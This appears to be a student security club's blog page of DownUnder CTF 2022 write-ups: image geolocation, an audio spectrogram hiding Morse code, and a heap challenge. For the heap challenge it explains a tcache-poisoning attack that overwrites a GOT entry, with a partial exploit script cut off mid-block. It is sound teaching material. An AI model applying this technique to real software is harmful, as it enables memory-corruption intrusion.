@@ -1,0 +1,326 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>DownUnder CTF 2022 - CUEH ComSec</title><meta name=Description content="Writeups of some interesting challenges from DownUnder CTF 2022"><meta property="og:title" content="DownUnder CTF 2022"><meta property="og:description" content="Writeups of some interesting challenges from DownUnder CTF 2022"><meta property="og:type" content="article"><meta property="og:url" content="https://cov-comsec.github.io/posts/down-under-ctf-2022/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-10T12:40:28+01:00"><meta property="article:modified_time" content="2022-10-13T17:35:44+01:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cov-comsec.github.io/logo.svg"><meta name=twitter:title content="DownUnder CTF 2022"><meta name=twitter:description content="Writeups of some interesting challenges from DownUnder CTF 2022"><meta name=application-name content="CUEH ComSec"><meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/down-under-ctf-2022/><link rel=prev href=https://cov-comsec.github.io/posts/2022_log_and_path_poisoning/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"DownUnder CTF 2022","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/down-under-ctf-2022\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"downunderctf, ctf, writeup","wordcount":2196,"url":"https:\/\/cov-comsec.github.io\/posts\/down-under-ctf-2022\/","datePublished":"2022-08-10T12:40:28+01:00","dateModified":"2022-10-13T17:35:44+01:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"Ben R, Alex S"},"description":"Writeups of some interesting challenges from DownUnder CTF 2022"}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/about/>About </a><a class=menu-item href=/galactic/>Galactic CTF </a><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/schedule/>Schedule </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/galactic/ title>Galactic CTF</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/schedule/ title>Schedule</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">DownUnder CTF 2022</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Ben R, Alex S</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2022-23/><i class="far fa-folder fa-fw"></i>Academic Year 2022-23</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-08-10>2022-08-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2196 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div></div><div class="details toc" id=toc-static kept=true><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#treasure-hunt>Treasure Hunt</a></li><li><a href=#pre-kebab-competition>Pre-kebab Competition</a></li></ul><ul><li><a href=#rage>Rage!</a><ul><li><a href=#the-challenge>The Challenge</a></li><li><a href=#testing-the-waters>Testing the waters</a></li><li><a href=#the-solution>The solution</a></li></ul></li><li><a href=#p0ison3d>p0ison3d</a><ul><li><a href=#the-challenge-1>The Challenge</a></li><li><a href=#source-code-review>Source Code Review</a><ul><li><a href=#add-note>Add Note</a></li><li><a href=#edit-note>Edit Note</a></li></ul></li><li><a href=#exploitation>Exploitation</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>DownUnder CTF was a 48 hour CTF that began on Friday 23rd September 2022. It was the first CTF of the year that ComSec
+played, we had quite a few new members playing this one so it was a great chance for them to practice their skills.</p><p>This article contains writeups of a range of difficulty and category, so this should be a good place for new members
+to see what a jeopardy style CTF looks like.</p><h2 id=treasure-hunt>Treasure Hunt</h2><h2 id=pre-kebab-competition>Pre-kebab Competition</h2><h1 id=pre-kebab-competition-writeup>Pre-Kebab Competition Writeup</h1><p><img class=lazyload src=/svg/loading.min.svg data-src=images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg data-srcset="images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg, images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg 1.5x, images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg 2x" data-sizes=auto alt=images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg title=images/ea002b34-ca4c-4e5f-80e5-3afed57138e5.jpg></p><p>I first began searching for the image using Google Lens the image below, is the result of that search:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/eef57e69-085a-475a-bc19-a62076f87d66.png data-srcset="images/eef57e69-085a-475a-bc19-a62076f87d66.png, images/eef57e69-085a-475a-bc19-a62076f87d66.png 1.5x, images/eef57e69-085a-475a-bc19-a62076f87d66.png 2x" data-sizes=auto alt=images/eef57e69-085a-475a-bc19-a62076f87d66.png title=images/eef57e69-085a-475a-bc19-a62076f87d66.png></p><p>As we can see, the results indicate that the building photographed is called &ldquo;The Epping Club&rdquo;. However, the CTF asks us
+to find &ldquo;<strong>Where</strong>&rdquo; it was taken from. So, we need to do more digging.</p><p>Once searching &ldquo;The Epping Club&rdquo; into google, we are then given the address of the location, which is shown below:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/4656039d-a033-4662-a4cd-a3525dc693e2.png data-srcset="images/4656039d-a033-4662-a4cd-a3525dc693e2.png, images/4656039d-a033-4662-a4cd-a3525dc693e2.png 1.5x, images/4656039d-a033-4662-a4cd-a3525dc693e2.png 2x" data-sizes=auto alt=images/4656039d-a033-4662-a4cd-a3525dc693e2.png title=images/4656039d-a033-4662-a4cd-a3525dc693e2.png></p><p>To further ensure that this is the correct location, we can see that the small billboard in the photograph appears to read &ldquo;Rawson&rdquo;:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png data-srcset="images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png, images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png 1.5x, images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png 2x" data-sizes=auto alt=images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png title=images/2e56cc16-1236-4c79-87fb-ecf7076d0bdb.png></p><p>So, we can be almost certain that it is the correct location. Now that we know the location of the building
+photographed, we can move onto investigating <strong>where</strong> it was taken. To do this, we can use google maps to take a
+look at the surrounding area to figure out a possible location.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png data-srcset="images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png, images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png 1.5x, images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png 2x" data-sizes=auto alt=images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png title=images/cccaeb77-93c0-4f8d-a983-83196637a0d1.png></p><p>After further inspection of the image, we know it must have been taken at roof level. This due to the roof of the
+building being far more present in the image. Whilst in Google Maps (ground level), the roof is less apparent at the
+same angle, which can be seen below:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png data-srcset="images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png, images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png 1.5x, images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png 2x" data-sizes=auto alt=images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png title=images/5d6fb26f-0dca-4b08-a7da-e4fa7cfeb1d5.png></p><p>Knowing this, once we take a look behind us, we are met with a huge clue:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png data-srcset="images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png, images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png 1.5x, images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png 2x" data-sizes=auto alt=images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png title=images/0a7914a3-c97a-456b-a3da-e5f1e3447e80.png></p><p>The two signs which appear on the roof of the &ldquo;Epping Hotel&rdquo; are also present in the original image</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/22012a50-2705-45be-a692-7b9331f54406.png data-srcset="images/22012a50-2705-45be-a692-7b9331f54406.png, images/22012a50-2705-45be-a692-7b9331f54406.png 1.5x, images/22012a50-2705-45be-a692-7b9331f54406.png 2x" data-sizes=auto alt=images/22012a50-2705-45be-a692-7b9331f54406.png title=images/22012a50-2705-45be-a692-7b9331f54406.png></p><p>So we know the flag must be:</p><p><strong>DUCTF{EppingHotel}</strong></p><h2 id=rage>Rage!</h2><p>Rage! was a challenge from the &ldquo;Miscellaneous&rdquo; category, a category in which challenges are completely random and unprecedented. Anything goes here and it is said
+that they tend to require a mixture of patience, knowledge and logic to solve.
+In the end Rage! was only worth 50 points as many teams solved it (420 solves, nice), but it proved to be a fun challenge to tackle no matter the skill level.</p><p>No prior knowledge is required to be able to follow this writeup.</p><h3 id=the-challenge>The Challenge</h3><p>The only hint the challenge gives is that you end up with a string, and that string is the flag needed to complete the challenge. Additionally,
+an audio file titled &lsquo;rage.wav&rsquo; is provided for you to download.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/RageChallenge.jpg data-srcset="/posts/down-under-ctf-2022/images/RageChallenge.jpg, images/RageChallenge.jpg 1.5x, /posts/down-under-ctf-2022/images/RageChallenge.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/RageChallenge.jpg title="Challenge Card"></p><h3 id=testing-the-waters>Testing the waters</h3><p>After downloading and listening to the audio it seemed like a mashup of random nonsense at first, with someone screaming &ldquo;Rage&rdquo; at the end. I could hear something was off
+in the background, but I couldn&rsquo;t quite pinpoint what was wrong with it. After listening to it a few more times I decided to open it in various
+audio editing software tools and play around with some settings. I started of with simple edits such as playing in reverse, at x0.5 speed, at x2.0 speed, and a few other settings, you get the idea.</p><p>Aside from that, a quick google search led me to some ideas of how I could potentially extract a string from an audio file. Some of these ideas included
+some quick &ldquo;win&rdquo; CLI commands (exiftool, strings, etc) to extract strings from the file, analysing the Hexadecimal data for something that may be out of place (like a hidden comment),
+and even using some python to extract metadata. All valid methods to attempt the challenge, however none of these methods bared any fruit in this case.</p><p>Finally, I came across a video on YouTube from a user named John Hammond in which he uses Sonic Visualiser to view and analyse contents of the audio file. In the video he generates
+a spectrogram of the audio and finds the flag hidden in it, as apparently this is a common way in CTFs to hide a flag for these type of challenges, so I gave it a go.</p><h3 id=the-solution>The solution</h3><p>Thankfully checking out the file in Sonic Visualiser resulted to be the correct decision, as I could see something in the spectrogram, but I could not make out what it was. As opposed to the video,
+the flag was not in clear text writing. I decided to play around with a lot of the settings, changing things like zoom, the colour scheme, dbs, frequencies and so many other things that I did not know
+what exactly they do, in hopes of seeing something that made sense within the spectrogram.</p><p>After spending a while playing around with it, our teammate ThatGuySteve pointed out it sounded like morse code in the background.
+Thanks to this it was much easier knowing what I had to look for, and stretching the spectrogram out as well as changing the colour contrast finally revealed the morse code.
+From there on it was simply a matter of manually typing the morse code into any online decoder to get the flag.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/spectogram.jpg data-srcset="/posts/down-under-ctf-2022/images/spectogram.jpg, images/spectogram.jpg 1.5x, /posts/down-under-ctf-2022/images/spectogram.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/spectogram.jpg title=Solution></p><p>The output of the morse code translated to &ldquo;RAGINGTOWEIRDLIBIDO&rdquo; which resulted to be the correct flag. Job done!</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/Decoder.jpg data-srcset="/posts/down-under-ctf-2022/images/Decoder.jpg, images/Decoder.jpg 1.5x, /posts/down-under-ctf-2022/images/Decoder.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/Decoder.jpg title=Solution2></p><h2 id=p0ison3d>p0ison3d</h2><p>This was a heap based pwn challenge that scored us 428 points. This writeup expects a basic understanding of binary exploitation, and the
+some foundational knowledge of dynamic memory.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/p0ison3d.png data-srcset="images/p0ison3d.png, images/p0ison3d.png 1.5x, images/p0ison3d.png 2x" data-sizes=auto alt=images/p0ison3d.png title="Challenge Card"></p><h3 id=the-challenge-1>The Challenge</h3><p>Three files were available to download. The binary itself, the source code, and a libc file (version 2.27). The presence
+of the libc file hinted at a heap challenge.</p><p>When given a specific libc file, it is recommended to patch the binary to use that libc file, and find a linker that is compatible
+with both. This can be done using <code>patchelf</code> and <a href=https://github.com/matrix1001/glibc-all-in-one target=_blank rel="noopener noreffer">this</a> useful repository of glibc.</p><p>The 4 option menu was another big clue that this is a heap challenge. The ability to create, edit, and delete an object on the heap
+is a classic setup for these types of challenges.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>❯ ./p0ison3d
+</span></span><span class=line><span class=cl>ez-notes v0.1
+</span></span><span class=line><span class=cl> v0.1 only supports up to 3 notes :(
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[1] add new note
+</span></span><span class=line><span class=cl>[2] read note
+</span></span><span class=line><span class=cl>[3] edit note
+</span></span><span class=line><span class=cl>[4] delete note
+</span></span><span class=line><span class=cl>[5] quit
+</span></span><span class=line><span class=cl>choice:
+</span></span></code></pre></td></tr></table></div></div><h3 id=source-code-review>Source Code Review</h3><p>A note structure is defined at the start of the source. A note is made up of an integer, and a pointer to the note data.
+The integer is used to identify whether the note is allocated. Up to three notes can be exist at a time.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>note</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span>   <span class=n>allocated</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>data</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>note_t</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>note_t</span> <span class=n>storage</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=add-note>Add Note</h4><p>The user can choose the index number for the note, the index is used as the position of the note in the storage array.
+The user cannot choose the size of chunk that is allocated, 128 bytes are requested, so a 144 byte chunk will be allocated.
+128 bytes of data can be written into the chunk, so there is no overflow.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>add_note</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>index</span> <span class=o>=</span> <span class=n>get_index</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: bad index&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>storage</span><span class=p>[</span><span class=n>index</span><span class=p>].</span><span class=n>allocated</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: index already allocated&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>data</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>get_data</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=mi>128</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: unable to read input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>storage</span><span class=p>[</span><span class=n>index</span><span class=p>].</span><span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>storage</span><span class=p>[</span><span class=n>index</span><span class=p>].</span><span class=n>allocated</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h4 id=edit-note>Edit Note</h4><p>The edit note function lets the user select a chunk and write data into it. There is a 25 byte buffer overflow, as the
+function reads up to 153 bytes of data into the chunk.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>edit_note</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>index</span> <span class=o>=</span> <span class=n>get_index</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>index</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: bad index&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>storage</span><span class=p>[</span><span class=n>index</span><span class=p>].</span><span class=n>allocated</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: index not allocated&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>get_data</span><span class=p>(</span><span class=n>storage</span><span class=p>[</span><span class=n>index</span><span class=p>].</span><span class=n>data</span><span class=p>,</span> <span class=mi>153</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;error: unable to read input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The delete note function is not interesting, so will be skipped. The two other relevent functions in the source code are
+<code>quit()</code> and <code>win()</code>. The reason for <code>quit()</code> will become apparent later.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>goodbye!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>win</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat ./flag.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So, to recap.</p><ul><li>0x90 sized heap chunks can be allocated, edited, and freed.</li><li>Up to three chunks can be allocated at a time.</li><li>There is a heap overflow of 25 bytes when editing a chunk.</li></ul><h3 id=exploitation>Exploitation</h3><p>Since this is libc 2.27, the tcache will be used to fulfil all the malloc requests we make. This is useful, as in earlier
+versions of libc the tcache had few protections. This will let us craft an attack called a <strong>tcache dup</strong>.</p><p>The tcache dup is an attack that involved corrupting the heap metadata stored inside a freed chunk to create a <em>fake chunk</em>
+somewhere else in memory, giving an attacker a write primitive in that area of memory. The attack requires the ability
+to corrupt heap metadata (such as an overflow or a write primitive) and a location to be overwritten.</p><p>The binary does not have position independent code, and only partial RelRO. This means the Global Offset Table can be overwritten.
+This is the final information needed for the attack. The plan is:</p><ul><li>Allocate three chunks (A, B, C)</li><li>Free the second and third chunks (C and B). They will be linked into the 0x90 tcache bin.</li><li>Corrupt chunk B&rsquo;s metadata to point to the GOT entry for <code>exit()</code>. This essentially links a section of the global offset table into the tcache.</li><li>Allocate 1 chunk (D), the chunk will occupy the same space as the freed chunk C, as chunk C is the first entry in the 0x90 tcache bin.</li><li>A second chunk (E), the second chunk, rather than being allocated inside the heap, will be allocated over the GOT entry for exit.</li><li>Writing data into chunk E will overwrite the GOT entry for exit, and redirect the program to the win function.</li></ul><p>Let&rsquo;s write some code! I already wrote some helper functions to make the main exploit more readable, as they take up a lot of space
+I&rsquo;ve left them out until the final exploit at the end, so if you&rsquo;re following along go get them!</p><p>First three chunks should be allocated, this can be done using the <code>create_note()</code> function.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=n>conn</span><span class=p>()</span> <span class=k>as</span> <span class=n>p</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_A</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_B</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;B&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_C</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;B&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=images/poison_ss1.jpg data-srcset="/posts/down-under-ctf-2022/images/poison_ss1.jpg, images/poison_ss1.jpg 1.5x, /posts/down-under-ctf-2022/images/poison_ss1.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/poison_ss1.jpg title="Three allocated chunks"></p><p>Next, delete note C and then note B. This can be done using the <code>delete_note()</code> function.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
